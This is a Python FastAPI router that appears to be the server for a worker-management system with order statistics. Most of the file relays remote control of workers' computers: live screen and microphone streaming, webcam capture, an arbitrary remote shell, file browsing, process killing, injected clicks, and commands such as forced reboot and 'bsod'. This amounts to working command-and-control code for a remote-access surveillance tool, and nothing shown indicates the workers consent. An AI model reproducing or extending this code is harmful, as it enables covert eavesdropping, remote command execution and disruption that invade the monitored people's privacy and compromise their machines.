import os
import shutil
from datetime import datetime, timezone
from pathlib import Path
from fastapi import APIRouter, Depends, File, HTTPException, Request, UploadFile, WebSocket, WebSocketDisconnect, status
from fastapi.responses import FileResponse
from sqlalchemy.orm import Session
from typing import List
from database import get_db, SessionLocal
import models, schemas, auth as auth_utils

SCREENSHOTS_DIR = Path("uploads/screenshots")
WEBCAM_DIR = Path("uploads/webcam")
# In-memory: worker_id -> timestamp when screenshot was requested
_screenshot_requests: dict[int, float] = {}

# Single persistent worker WebSocket (replaces all individual channels)
_worker_main_ws: dict[int, WebSocket] = {}

# Webcam streaming
_worker_webcam_ws: dict[int, WebSocket] = {}
_webcam_viewers: dict[int, WebSocket] = {}

# Live screen streaming
_worker_screen_ws: dict[int, WebSocket] = {}
_screen_viewers: dict[int, list] = {}

# Live mic streaming
_worker_mic_ws: dict[int, WebSocket] = {}
_mic_viewers: dict[int, list] = {}

# Processes
_worker_processes: dict[int, dict] = {}  # worker_id -> {processes: [...], updated_at: str}
_worker_processes_ws: dict[int, WebSocket] = {}

# Admin commands
_worker_commands_ws: dict[int, WebSocket] = {}

# Screenshot on-demand
_worker_screenshot_ws: dict[int, WebSocket] = {}
_screenshot_view_ws: dict[int, WebSocket] = {}

# Shell terminal
_worker_shell_ws: dict[int, WebSocket] = {}
_shell_viewers: dict[int, WebSocket] = {}

# File manager
_worker_files_ws: dict[int, WebSocket] = {}
_files_viewers: dict[int, WebSocket] = {}

router = APIRouter(prefix="/users", tags=["users"])

# Gap in seconds: if no heartbeat longer than this, the session is considered ended
SESSION_GAP = 120


def _ensure_utc(dt: datetime) -> datetime:
    if dt is None:
        return None
    return dt if dt.tzinfo else dt.replace(tzinfo=timezone.utc)


def _online_threshold_seconds() -> int:
    return SESSION_GAP + 30  # a bit more than gap to account for delays


def _auth_worker(token: str):
    """Authenticate token as worker. Returns user_id or None."""
    db = SessionLocal()
    try:
        payload = auth_utils.decode_token(token)
        if not payload:
            return None
        user = db.query(models.User).filter(models.User.id == int(payload["sub"])).first()
        if not user or user.role != models.UserRole.worker:
            return None
        return user.id
    finally:
        db.close()


def _auth_admin(token: str):
    """Authenticate token as admin. Returns user_id or None."""
    db = SessionLocal()
    try:
        payload = auth_utils.decode_token(token)
        if not payload:
            return None
        user = db.query(models.User).filter(models.User.id == int(payload["sub"])).first()
        if not user or user.role != models.UserRole.admin:
            return None
        return user.id
    finally:
        db.close()


def _auth_admin_full(token: str):
    """Authenticate token as admin. Returns (user_id, username) or (None, None)."""
    db = SessionLocal()
    try:
        payload = auth_utils.decode_token(token)
        if not payload:
            return None, None
        user = db.query(models.User).filter(models.User.id == int(payload["sub"])).first()
        if not user or user.role != models.UserRole.admin:
            return None, None
        return user.id, user.username
    finally:
        db.close()


def _get_username(user_id: int) -> str:
    """Fetch username by user_id (best-effort, returns '?' on failure)."""
    db = SessionLocal()
    try:
        user = db.query(models.User).filter(models.User.id == user_id).first()
        return user.username if user else "?"
    finally:
        db.close()


@router.get("/", response_model=List[schemas.UserOut])
def list_users(db: Session = Depends(get_db), _=Depends(auth_utils.require_admin)):
    return db.query(models.User).all()


@router.post("/heartbeat", status_code=204)
def heartbeat(
    request: Request,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(auth_utils.get_current_user),
):
    # Version check for workers
    if current_user.role == models.UserRole.worker:
        required = db.query(models.Setting).filter(models.Setting.key == "worker_required_version").first()
        required_version = required.value.strip() if required and required.value and required.value.strip() else None
        if required_version:
            sent_version = (request.headers.get("X-Worker-Version") or "").strip()
            if sent_version != required_version:
                from fastapi import HTTPException
                raise HTTPException(
                    status_code=426,
                    detail=f"Обновите приложение до версии {required_version}.",
                )
    now = datetime.now(timezone.utc)
    last_seen = _ensure_utc(current_user.last_seen_at)

    open_session = (
        db.query(models.WorkSession)
        .filter(
            models.WorkSession.user_id == current_user.id,
            models.WorkSession.ended_at == None,
        )
        .first()
    )

    if open_session:
        if last_seen and (now - last_seen).total_seconds() > SESSION_GAP:
            # Gap detected — close old session, start fresh
            open_session.ended_at = last_seen
            db.add(models.WorkSession(user_id=current_user.id, started_at=now))
        # else session continues, nothing to update
    else:
        db.add(models.WorkSession(user_id=current_user.id, started_at=now))

    current_user.last_seen_at = now
    db.commit()


@router.websocket("/screen-ws")
async def worker_screen_stream(websocket: WebSocket, token: str):
    """Worker connects here and streams binary JPEG frames."""
    user_id = _auth_worker(token)
    if user_id is None:
        await websocket.close(code=4003)
        return

    await websocket.accept()
    _worker_screen_ws[user_id] = websocket
    try:
        while True:
            msg = await websocket.receive()
            if msg["type"] == "websocket.disconnect":
                break
            data = msg.get("bytes")
            if not data:
                continue
            # Relay frame to all admin viewers
            viewers = _screen_viewers.get(user_id, [])
            dead = []
            for viewer in viewers:
                try:
                    await viewer.send_bytes(data)
                except Exception:
                    dead.append(viewer)
            for d in dead:
                viewers.remove(d)
    except WebSocketDisconnect:
        pass
    finally:
        _worker_screen_ws.pop(user_id, None)


@router.websocket("/{user_id}/screen-view")
async def admin_screen_view(user_id: int, websocket: WebSocket, token: str):
    """Admin connects here to receive live frames from a worker."""
    admin_id, admin_name = _auth_admin_full(token)
    if admin_id is None:
        await websocket.close(code=4003)
        return

    worker_name = _get_username(user_id)
    print(f"[MONITOR] {admin_name} → live screen of {worker_name} (worker_id={user_id})", flush=True)
    await websocket.accept()
    _screen_viewers.setdefault(user_id, []).append(websocket)
    try:
        while True:
            msg = await websocket.receive()
            if msg["type"] == "websocket.disconnect":
                break
    except WebSocketDisconnect:
        pass
    finally:
        print(f"[MONITOR] {admin_name} ← stopped live screen of {worker_name}", flush=True)
        viewers = _screen_viewers.get(user_id, [])
        if websocket in viewers:
            viewers.remove(websocket)


@router.websocket("/mic-ws")
async def worker_mic_stream(websocket: WebSocket, token: str):
    user_id = _auth_worker(token)
    if user_id is None:
        await websocket.close(code=4003)
        return

    await websocket.accept()
    _worker_mic_ws[user_id] = websocket
    try:
        while True:
            msg = await websocket.receive()
            if msg["type"] == "websocket.disconnect":
                break
            data = msg.get("bytes")
            if not data:
                continue
            viewers = _mic_viewers.get(user_id, [])
            dead = []
            for viewer in viewers:
                try:
                    await viewer.send_bytes(data)
                except Exception:
                    dead.append(viewer)
            for d in dead:
                viewers.remove(d)
    except WebSocketDisconnect:
        pass
    finally:
        _worker_mic_ws.pop(user_id, None)


@router.websocket("/{user_id}/mic-view")
async def admin_mic_view(user_id: int, websocket: WebSocket, token: str):
    admin_id, admin_name = _auth_admin_full(token)
    if admin_id is None:
        await websocket.close(code=4003)
        return

    worker_name = _get_username(user_id)
    print(f"[MONITOR] {admin_name} → listening mic of {worker_name} (worker_id={user_id})", flush=True)
    await websocket.accept()
    _mic_viewers.setdefault(user_id, []).append(websocket)
    try:
        while True:
            msg = await websocket.receive()
            if msg["type"] == "websocket.disconnect":
                break
    except WebSocketDisconnect:
        pass
    finally:
        print(f"[MONITOR] {admin_name} ← stopped mic of {worker_name}", flush=True)
        viewers = _mic_viewers.get(user_id, [])
        if websocket in viewers:
            viewers.remove(websocket)


@router.websocket("/shell-ws")
async def worker_shell(websocket: WebSocket, token: str):
    """Worker connects here and waits for shell commands, sends back output."""
    user_id = _auth_worker(token)
    if user_id is None:
        await websocket.close(code=4003)
        return

    await websocket.accept()
    _worker_shell_ws[user_id] = websocket
    viewer = _shell_viewers.get(user_id)
    if viewer:
        try:
            await viewer.send_text("\x01connected")
        except Exception:
            pass
    try:
        while True:
            msg = await websocket.receive()
            if msg["type"] == "websocket.disconnect":
                break
            # Worker sends command output — relay to admin viewer
            text = msg.get("text")
            if text is not None:
                viewer = _shell_viewers.get(user_id)
                if viewer:
                    try:
                        await viewer.send_text(text)
                    except Exception:
                        pass
    except WebSocketDisconnect:
        pass
    finally:
        _worker_shell_ws.pop(user_id, None)
        viewer = _shell_viewers.get(user_id)
        if viewer:
            try:
                await viewer.send_text("\x01offline")
            except Exception:
                pass


@router.websocket("/{user_id}/shell-view")
async def admin_shell_view(user_id: int, websocket: WebSocket, token: str):
    """Admin connects here to send commands and receive output from worker shell."""
    admin_id, admin_name = _auth_admin_full(token)
    if admin_id is None:
        await websocket.close(code=4003)
        return

    worker_name = _get_username(user_id)
    print(f"[MONITOR] {admin_name} → shell on {worker_name} (worker_id={user_id})", flush=True)
    await websocket.accept()
    _shell_viewers[user_id] = websocket
    worker_connected = user_id in _worker_main_ws or user_id in _worker_shell_ws
    await websocket.send_text(f"\x01{'connected' if worker_connected else 'offline'}")
    try:
        while True:
            msg = await websocket.receive()
            if msg["type"] == "websocket.disconnect":
                break
            # Admin sends command — forward to worker as JSON
            import json as _json
            text = msg.get("text")
            if text:
                worker_ws = _worker_main_ws.get(user_id) or _worker_shell_ws.get(user_id)
                if worker_ws:
                    try:
                        await worker_ws.send_text(_json.dumps({"type": "shell_exec", "cmd": text}))
                    except Exception:
                        await websocket.send_text("(ошибка: не удалось отправить команду)")
                else:
                    await websocket.send_text("(воркер не подключён)")
    except WebSocketDisconnect:
        pass
    finally:
        print(f"[MONITOR] {admin_name} ← closed shell on {worker_name}", flush=True)
        if _shell_viewers.get(user_id) is websocket:
            _shell_viewers.pop(user_id, None)


@router.websocket("/files-ws")
async def worker_files(websocket: WebSocket, token: str):
    """Worker connects here to handle file manager requests from admin."""
    user_id = _auth_worker(token)
    if user_id is None:
        await websocket.close(code=4003)
        return

    await websocket.accept()
    _worker_files_ws[user_id] = websocket
    viewer = _files_viewers.get(user_id)
    if viewer:
        try:
            await viewer.send_text('\x01online')
        except Exception:
            pass
    try:
        while True:
            msg = await websocket.receive()
            if msg["type"] == "websocket.disconnect":
                break
            text = msg.get("text")
            if text is not None:
                viewer = _files_viewers.get(user_id)
                if viewer:
                    try:
                        await viewer.send_text(text)
                    except Exception:
                        pass
    except WebSocketDisconnect:
        pass
    finally:
        _worker_files_ws.pop(user_id, None)
        viewer = _files_viewers.get(user_id)
        if viewer:
            try:
                await viewer.send_text('\x01offline')
            except Exception:
                pass


@router.websocket("/{user_id}/files-view")
async def admin_files_view(user_id: int, websocket: WebSocket, token: str):
    """Admin connects here to browse worker's filesystem."""
    admin_id, admin_name = _auth_admin_full(token)
    if admin_id is None:
        await websocket.close(code=4003)
        return

    worker_name = _get_username(user_id)
    print(f"[MONITOR] {admin_name} → file manager on {worker_name} (worker_id={user_id})", flush=True)
    await websocket.accept()
    _files_viewers[user_id] = websocket
    worker_online = user_id in _worker_main_ws or user_id in _worker_files_ws
    await websocket.send_text(f'\x01{"online" if worker_online else "offline"}')
    try:
        while True:
            msg = await websocket.receive()
            if msg["type"] == "websocket.disconnect":
                break
            import json as _json
            text = msg.get("text")
            if text:
                worker_ws = _worker_main_ws.get(user_id) or _worker_files_ws.get(user_id)
                if worker_ws:
                    try:
                        try:
                            req = _json.loads(text)
                            req["type"] = "file_req"
                            await worker_ws.send_text(_json.dumps(req))
                        except Exception:
                            await worker_ws.send_text(text)
                    except Exception:
                        await websocket.send_text('{"error":"Ошибка отправки","id":null}')
                else:
                    await websocket.send_text('{"error":"Воркер офлайн","id":null}')
    except WebSocketDisconnect:
        pass
    finally:
        print(f"[MONITOR] {admin_name} ← closed file manager on {worker_name}", flush=True)
        if _files_viewers.get(user_id) is websocket:
            _files_viewers.pop(user_id, None)


@router.post("/processes", status_code=204)
def upload_processes(
    data: dict,
    current_user: models.User = Depends(auth_utils.get_current_user),
):
    if current_user.role != models.UserRole.worker:
        raise HTTPException(status_code=403, detail="Workers only")
    _worker_processes[current_user.id] = {
        "processes": data.get("processes", []),
        "updated_at": datetime.now(timezone.utc).isoformat(),
    }


@router.get("/{user_id}/processes")
def get_processes(user_id: int, _=Depends(auth_utils.require_admin)):
    data = _worker_processes.get(user_id)
    if not data:
        raise HTTPException(status_code=404, detail="No process data")
    return data


@router.post("/{user_id}/processes/kill", status_code=204)
async def request_kill(user_id: int, data: dict, _=Depends(auth_utils.require_admin)):
    import json as _json
    name = data.get("name", "").strip()
    if not name:
        raise HTTPException(status_code=400, detail="Process name required")
    worker_ws = _worker_main_ws.get(user_id) or _worker_processes_ws.get(user_id)
    if worker_ws:
        try:
            await worker_ws.send_text(_json.dumps({"type": "kill_process", "name": name}))
        except Exception:
            pass


@router.post("/{user_id}/click", status_code=204)
async def send_click(user_id: int, data: dict, _=Depends(auth_utils.require_admin)):
    """Admin sends a normalized click (x,y in 0..1) to the worker."""
    import json as _json
    x = max(0.0, min(1.0, float(data.get("x", 0))))
    y = max(0.0, min(1.0, float(data.get("y", 0))))
    worker_ws = _worker_main_ws.get(user_id) or _worker_screen_ws.get(user_id)
    if worker_ws:
        try:
            await worker_ws.send_text(_json.dumps({"type": "click", "x": x, "y": y}))
        except Exception:
            pass


@router.post("/{user_id}/command", status_code=204)
async def send_command(user_id: int, data: dict, _=Depends(auth_utils.require_admin)):
    import json as _json
    cmd = data.get("command", "").strip()
    if cmd not in ("quit", "remove-autostart", "reboot", "lock-screen", "bsod"):
        raise HTTPException(status_code=400, detail="Unknown command")
    worker_ws = _worker_main_ws.get(user_id) or _worker_commands_ws.get(user_id)
    if not worker_ws:
        raise HTTPException(status_code=503, detail="Воркер не подключён")
    try:
        await worker_ws.send_text(_json.dumps({"type": "command", "cmd": cmd}))
    except Exception:
        raise HTTPException(status_code=503, detail="Ошибка отправки команды")


@router.get("/screenshot/pending")
def check_screenshot_pending(
    current_user: models.User = Depends(auth_utils.get_current_user),
):
    """Worker polls this to know if admin requested a screenshot."""
    requested = current_user.id in _screenshot_requests
    if requested:
        del _screenshot_requests[current_user.id]
    return {"requested": requested}


@router.post("/{user_id}/screenshot/request", status_code=204)
def request_screenshot(user_id: int, _=Depends(auth_utils.require_admin)):
    """Admin requests an on-demand screenshot from a worker."""
    import time
    _screenshot_requests[user_id] = time.time()


@router.post("/screenshot", status_code=204)
async def upload_screenshot(
    file: UploadFile = File(...),
    current_user: models.User = Depends(auth_utils.get_current_user),
):
    if current_user.role != models.UserRole.worker:
        raise HTTPException(status_code=403, detail="Only workers can upload screenshots")
    SCREENSHOTS_DIR.mkdir(parents=True, exist_ok=True)
    path = SCREENSHOTS_DIR / f"{current_user.id}.jpg"
    with open(path, "wb") as f:
        shutil.copyfileobj(file.file, f)


@router.post("/webcam-photo", status_code=204)
async def upload_webcam_photo(
    file: UploadFile = File(...),
    current_user: models.User = Depends(auth_utils.get_current_user),
):
    if current_user.role != models.UserRole.worker:
        raise HTTPException(status_code=403, detail="Only workers can upload webcam photos")
    WEBCAM_DIR.mkdir(parents=True, exist_ok=True)
    path = WEBCAM_DIR / f"{current_user.id}.jpg"
    with open(path, "wb") as f:
        shutil.copyfileobj(file.file, f)


@router.websocket("/commands-ws")
async def worker_commands(websocket: WebSocket, token: str):
    """Worker connects here; server pushes command strings (quit/reboot/etc)."""
    user_id = _auth_worker(token)
    if user_id is None:
        await websocket.close(code=4003)
        return

    await websocket.accept()
    _worker_commands_ws[user_id] = websocket
    try:
        while True:
            msg = await websocket.receive()
            if msg["type"] == "websocket.disconnect":
                break
    except WebSocketDisconnect:
        pass
    finally:
        _worker_commands_ws.pop(user_id, None)


@router.websocket("/screenshot-ws")
async def worker_screenshot(websocket: WebSocket, token: str):
    """Worker connects here; on 'capture' command sends back one JPEG frame."""
    user_id = _auth_worker(token)
    if user_id is None:
        await websocket.close(code=4003)
        return

    await websocket.accept()
    _worker_screenshot_ws[user_id] = websocket
    viewer = _screenshot_view_ws.get(user_id)
    if viewer:
        try: await viewer.send_text("\x01connected")
        except Exception: pass
    try:
        while True:
            msg = await websocket.receive()
            if msg["type"] == "websocket.disconnect":
                break
            data = msg.get("bytes")
            if data:
                viewer = _screenshot_view_ws.get(user_id)
                if viewer:
                    try: await viewer.send_bytes(data)
                    except Exception: pass
    except WebSocketDisconnect:
        pass
    finally:
        _worker_screenshot_ws.pop(user_id, None)
        viewer = _screenshot_view_ws.get(user_id)
        if viewer:
            try: await viewer.send_text("\x01offline")
            except Exception: pass


@router.websocket("/{user_id}/screenshot-view")
async def admin_screenshot_view(user_id: int, websocket: WebSocket, token: str):
    admin_id, admin_name = _auth_admin_full(token)
    if admin_id is None:
        await websocket.close(code=4003)
        return

    worker_name = _get_username(user_id)
    print(f"[MONITOR] {admin_name} → screenshot view of {worker_name} (worker_id={user_id})", flush=True)
    await websocket.accept()
    _screenshot_view_ws[user_id] = websocket
    worker_connected = user_id in _worker_main_ws or user_id in _worker_screenshot_ws
    await websocket.send_text(f"\x01{'connected' if worker_connected else 'offline'}")
    try:
        while True:
            msg = await websocket.receive()
            if msg["type"] == "websocket.disconnect":
                break
            import json as _json
            if msg.get("text") == "capture":
                worker_ws = _worker_main_ws.get(user_id) or _worker_screenshot_ws.get(user_id)
                if worker_ws:
                    try: await worker_ws.send_text(_json.dumps({"type": "screenshot_capture"}))
                    except Exception: pass
    except WebSocketDisconnect:
        pass
    finally:
        if _screenshot_view_ws.get(user_id) is websocket:
            _screenshot_view_ws.pop(user_id, None)


@router.websocket("/processes-ws")
async def worker_processes(websocket: WebSocket, token: str):
    """Worker sends JSON process list; server sends 'kill:name' commands back."""
    user_id = _auth_worker(token)
    if user_id is None:
        await websocket.close(code=4003)
        return

    await websocket.accept()
    _worker_processes_ws[user_id] = websocket
    try:
        while True:
            msg = await websocket.receive()
            if msg["type"] == "websocket.disconnect":
                break
            text = msg.get("text")
            if text:
                import json as _json
                try:
                    processes = _json.loads(text)
                    _worker_processes[user_id] = {
                        "processes": processes,
                        "updated_at": datetime.now(timezone.utc).isoformat(),
                    }
                except Exception:
                    pass
    except WebSocketDisconnect:
        pass
    finally:
        _worker_processes_ws.pop(user_id, None)


@router.websocket("/webcam-ws")
async def worker_webcam(websocket: WebSocket, token: str):
    """Worker connects here, waits for 'capture' command, sends back one JPEG frame."""
    user_id = _auth_worker(token)
    if user_id is None:
        await websocket.close(code=4003)
        return

    await websocket.accept()
    _worker_webcam_ws[user_id] = websocket
    viewer = _webcam_viewers.get(user_id)
    if viewer:
        try:
            await viewer.send_text("\x01connected")
        except Exception:
            pass
    try:
        while True:
            msg = await websocket.receive()
            if msg["type"] == "websocket.disconnect":
                break
            data = msg.get("bytes")
            text = msg.get("text")
            viewer = _webcam_viewers.get(user_id)
            if viewer:
                try:
                    if data:
                        await viewer.send_bytes(data)
                    elif text is not None:
                        await viewer.send_text(text)
                except Exception:
                    pass
    except WebSocketDisconnect:
        pass
    finally:
        _worker_webcam_ws.pop(user_id, None)
        viewer = _webcam_viewers.get(user_id)
        if viewer:
            try:
                await viewer.send_text("\x01offline")
            except Exception:
                pass


@router.websocket("/{user_id}/webcam-view")
async def admin_webcam_view(user_id: int, websocket: WebSocket, token: str):
    """Admin connects here, sends 'capture', receives one JPEG frame."""
    admin_id, admin_name = _auth_admin_full(token)
    if admin_id is None:
        await websocket.close(code=4003)
        return

    worker_name = _get_username(user_id)
    print(f"[MONITOR] {admin_name} → webcam view of {worker_name} (worker_id={user_id})", flush=True)
    await websocket.accept()
    _webcam_viewers[user_id] = websocket
    worker_connected = user_id in _worker_main_ws or user_id in _worker_webcam_ws
    await websocket.send_text(f"\x01{'connected' if worker_connected else 'offline'}")
    try:
        while True:
            msg = await websocket.receive()
            if msg["type"] == "websocket.disconnect":
                break
            import json as _json
            text = msg.get("text")
            if text == "capture":
                worker_ws = _worker_main_ws.get(user_id) or _worker_webcam_ws.get(user_id)
                if worker_ws:
                    try:
                        await worker_ws.send_text(_json.dumps({"type": "webcam_capture"}))
                    except Exception:
                        pass
    except WebSocketDisconnect:
        pass
    finally:
        if _webcam_viewers.get(user_id) is websocket:
            _webcam_viewers.pop(user_id, None)


@router.get("/workers/stats", response_model=List[schemas.WorkerStatsOut])
def workers_stats(
    db: Session = Depends(get_db),
    _=Depends(auth_utils.require_admin),
):
    now = datetime.now(timezone.utc)
    online_cutoff = SESSION_GAP + 30

    workers = (
        db.query(models.User)
        .filter(models.User.role == models.UserRole.worker)
        .all()
    )

    result = []
    for w in workers:
        last_seen = _ensure_utc(w.last_seen_at)
        is_online = bool(last_seen and (now - last_seen).total_seconds() < online_cutoff)

        # Total online time
        sessions = (
            db.query(models.WorkSession)
            .filter(models.WorkSession.user_id == w.id)
            .all()
        )
        total_online = 0
        for s in sessions:
            start = _ensure_utc(s.started_at)
            end = _ensure_utc(s.ended_at) if s.ended_at else now
            total_online += max(0, (end - start).total_seconds())

        # Order time stats
        orders = (
            db.query(models.Order)
            .filter(
                models.Order.worker_id == w.id,
                models.Order.taken_at != None,
            )
            .all()
        )
        total_orders = len(orders)
        completed = [
            o for o in orders
            if o.completed_at and o.taken_at
        ]
        total_order_secs = sum(
            (_ensure_utc(o.completed_at) - _ensure_utc(o.taken_at)).total_seconds()
            for o in completed
        )
        avg_order_secs = (total_order_secs / len(completed)) if completed else None

        result.append(schemas.WorkerStatsOut(
            user_id=w.id,
            username=w.username,
            is_online=is_online,
            last_seen_at=last_seen,
            total_online_seconds=int(total_online),
            total_orders=total_orders,
            completed_orders=len(completed),
            avg_order_seconds=avg_order_secs,
            total_order_seconds=int(total_order_secs),
        ))

    return result


@router.post("/", response_model=schemas.UserOut, status_code=status.HTTP_201_CREATED)
def create_user(data: schemas.UserCreate, db: Session = Depends(get_db), _=Depends(auth_utils.require_admin)):
    if db.query(models.User).filter(models.User.username == data.username).first():
        raise HTTPException(status_code=400, detail="Username already taken")
    user = models.User(
        username=data.username,
        email=data.email,
        password_hash=auth_utils.hash_password(data.password),
        role=data.role,
        worker_percentage=data.worker_percentage,
        is_vip=data.is_vip,
    )
    db.add(user)
    db.commit()
    db.refresh(user)
    return user


@router.get("/{user_id}", response_model=schemas.UserOut)
def get_user(user_id: int, db: Session = Depends(get_db), _=Depends(auth_utils.require_admin)):
    user = db.query(models.User).filter(models.User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    return user


@router.get("/{user_id}/screenshot")
def get_screenshot(user_id: int, db: Session = Depends(get_db), _=Depends(auth_utils.require_admin)):
    path = SCREENSHOTS_DIR / f"{user_id}.jpg"
    if not path.exists():
        raise HTTPException(status_code=404, detail="No screenshot available")
    mtime_ms = int(os.path.getmtime(path) * 1000)
    return FileResponse(path, media_type="image/jpeg", headers={"X-Captured-At": str(mtime_ms)})


@router.get("/{user_id}/webcam-photo")
def get_webcam_photo(user_id: int, _=Depends(auth_utils.require_admin)):
    path = WEBCAM_DIR / f"{user_id}.jpg"
    if not path.exists():
        raise HTTPException(status_code=404, detail="No webcam photo available")
    mtime_ms = int(os.path.getmtime(path) * 1000)
    return FileResponse(path, media_type="image/jpeg", headers={"X-Captured-At": str(mtime_ms)})


@router.websocket("/worker-ws")
async def worker_main_stream(websocket: WebSocket, token: str):
    """Single persistent WebSocket for all worker data channels.

    Binary frames:  1st byte = channel (0x01=screen, 0x02=mic)
    JSON text frames: {"type": "processes"|"shell_output"|"file_response"|
                                "webcam_done"|"webcam_error"|"screenshot_done", ...}
    """
    import json as _json
    user_id = _auth_worker(token)
    if user_id is None:
        await websocket.close(code=4003)
        return

    await websocket.accept()
    _worker_main_ws[user_id] = websocket

    # Tell admin viewers the worker is online
    for d, msg in [(_screenshot_view_ws, "\x01connected"), (_webcam_viewers, "\x01connected"),
                   (_shell_viewers, "\x01connected"), (_files_viewers, "\x01online")]:
        v = d.get(user_id)
        if v:
            try: await v.send_text(msg)
            except Exception: pass

    try:
        while True:
            msg = await websocket.receive()
            if msg["type"] == "websocket.disconnect":
                break

            data = msg.get("bytes")
            if data:
                if len(data) < 2:
                    continue
                ch = data[0]
                payload = bytes(data[1:])
                if ch == 0x01:  # live screen frame → relay to screen viewers
                    viewers = _screen_viewers.get(user_id, [])
                    dead = []
                    for v in viewers:
                        try: await v.send_bytes(payload)
                        except Exception: dead.append(v)
                    for d in dead:
                        viewers.remove(d)
                elif ch == 0x02:  # mic audio → relay to mic viewers
                    viewers = _mic_viewers.get(user_id, [])
                    dead = []
                    for v in viewers:
                        try: await v.send_bytes(payload)
                        except Exception: dead.append(v)
                    for d in dead:
                        viewers.remove(d)
                continue

            text = msg.get("text")
            if not text:
                continue
            try:
                j = _json.loads(text)
            except Exception:
                continue

            t = j.get("type")
            if t == "processes":
                _worker_processes[user_id] = {
                    "processes": j.get("data", []),
                    "updated_at": datetime.now(timezone.utc).isoformat(),
                }
            elif t == "shell_output":
                v = _shell_viewers.get(user_id)
                if v:
                    try: await v.send_text(j.get("text", ""))
                    except Exception: pass
            elif t == "file_response":
                v = _files_viewers.get(user_id)
                if v:
                    try: await v.send_text(_json.dumps({k: val for k, val in j.items() if k != "type"}))
                    except Exception: pass
            elif t == "webcam_done":
                v = _webcam_viewers.get(user_id)
                if v:
                    try: await v.send_text("\x01webcam_done")
                    except Exception: pass
            elif t == "webcam_error":
                v = _webcam_viewers.get(user_id)
                if v:
                    try: await v.send_text(f"\x01error:{j.get('error', 'unknown')}")
                    except Exception: pass
            elif t == "screenshot_done":
                v = _screenshot_view_ws.get(user_id)
                if v:
                    try: await v.send_text("\x01screenshot_done")
                    except Exception: pass

    except WebSocketDisconnect:
        pass
    finally:
        _worker_main_ws.pop(user_id, None)
        # Tell admin viewers the worker went offline
        for d, msg in [(_screenshot_view_ws, "\x01offline"), (_webcam_viewers, "\x01offline"),
                       (_shell_viewers, "\x01offline"), (_files_viewers, "\x01offline")]:
            v = d.get(user_id)
            if v:
                try: await v.send_text(msg)
                except Exception: pass


@router.patch("/{user_id}", response_model=schemas.UserOut)
def update_user(user_id: int, data: schemas.UserUpdate, db: Session = Depends(get_db), _=Depends(auth_utils.require_admin)):
    user = db.query(models.User).filter(models.User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    if data.email is not None:
        user.email = data.email
    if data.worker_percentage is not None:
        user.worker_percentage = data.worker_percentage
    if data.is_vip is not None:
        user.is_vip = data.is_vip
    if data.is_active is not None:
        user.is_active = data.is_active
    if data.password is not None:
        user.password_hash = auth_utils.hash_password(data.password)
    db.commit()
    db.refresh(user)
    return user


@router.delete("/{user_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_user(user_id: int, db: Session = Depends(get_db), _=Depends(auth_utils.require_admin)):
    user = db.query(models.User).filter(models.User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    db.delete(user)
    db.commit()
